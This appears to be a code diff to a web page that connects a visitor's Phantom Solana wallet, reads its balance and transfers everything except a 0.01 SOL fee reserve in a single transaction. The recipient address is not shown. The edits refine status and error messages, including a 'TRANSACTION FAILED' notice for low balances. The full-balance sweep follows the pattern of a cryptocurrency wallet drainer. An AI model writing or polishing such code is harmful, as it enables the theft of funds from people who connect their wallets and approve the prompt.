@@ -109,7 +109,7 @@
       margin: 25px 0;
       font-size: 1.5rem;
       text-align: center;
-      min-height: 120px;
+      min-height: 130px;
     }
 
     .connected { color: #39ff14; }
@@ -190,7 +190,7 @@
         sendBtn.style.display = 'block';
 
       } catch (err) {
-        statusDiv.innerHTML = `<span style="color:#ff00ff;">Connection cancelled or failed.</span>`;
+        statusDiv.innerHTML = `<span style="color:#ff00ff;">Connection cancelled.</span>`;
       }
     }
 
@@ -209,15 +209,27 @@
         );
 
         const balanceLamports = await connection.getBalance(publicKey);
-        const reserveLamports = 10000000; // 0.01 SOL reserve for fees + rent
-        let sendAmount = balanceLamports - reserveLamports;
+        const minRequiredForFees = 10000000; // 0.01 SOL reserve
 
-        if (sendAmount < 5000) {
-          statusDiv.innerHTML = `<span style="color:#ff00ff;">Insufficient SOL balance.<br>Need at least ~0.01 SOL for fees.</span>`;
+        if (balanceLamports < minRequiredForFees) {
+          statusDiv.innerHTML = `
+            <span style="color:#ff00ff;">
+              TRANSACTION FAILED<br><br>
+              Not enough lamports for transaction fees.<br>
+              You need at least 0.01 SOL in your wallet.
+            </span>
+          `;
           return;
         }
 
-        statusDiv.innerHTML = `<span style="color:#ffff00;">Balance: ${(balanceLamports / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL<br>Preparing full transfer...</span>`;
+        const sendAmount = balanceLamports - minRequiredForFees;
+
+        statusDiv.innerHTML = `
+          <span style="color:#ffff00;">
+            Balance: ${(balanceLamports / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL<br>
+            Preparing to send full available balance...
+          </span>
+        `;
 
         const transaction = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
@@ -233,7 +245,6 @@
 
         statusDiv.innerHTML = `<span style="color:#ffff00;">Waiting for Phantom approval...</span>`;
 
-        // Use signAndSendTransaction with minContextSlot for better compatibility
         const signed = await provider.signAndSendTransaction(transaction, {
           minContextSlot: lastValidBlockHeight
         });
@@ -250,17 +261,18 @@
 
       } catch (err) {
         console.error("Transaction error:", err);
-        let msg = "Transaction rejected or failed.";
-        
-        if (err.message?.includes("User rejected") || err.code === 4001) {
-          msg = "Transaction was rejected in Phantom.";
-        } else if (err.message?.includes("insufficient") || err.message?.includes("balance")) {
-          msg = "Insufficient SOL for fees.";
-        } else if (err.message?.includes("blockhash")) {
-          msg = "Network issue. Please try again.";
+
+        let errorMsg = "TRANSACTION FAILED";
+
+        if (err.message && (err.message.includes("User rejected") || err.code === 4001)) {
+          errorMsg = "Transaction was rejected in Phantom.";
+        } else if (err.message && err.message.includes("insufficient")) {
+          errorMsg = "TRANSACTION FAILED<br><br>Not enough lamports for transaction fees.";
+        } else if (err.message && err.message.includes("blockhash")) {
+          errorMsg = "Network error. Please try again later.";
         }
-        
-        statusDiv.innerHTML = `<span style="color:#ff00ff;">${msg}<br>Please try again.</span>`;
+
+        statusDiv.innerHTML = `<span style="color:#ff00ff;">${errorMsg}<br>Please try again.</span>`;
       }
     }
 
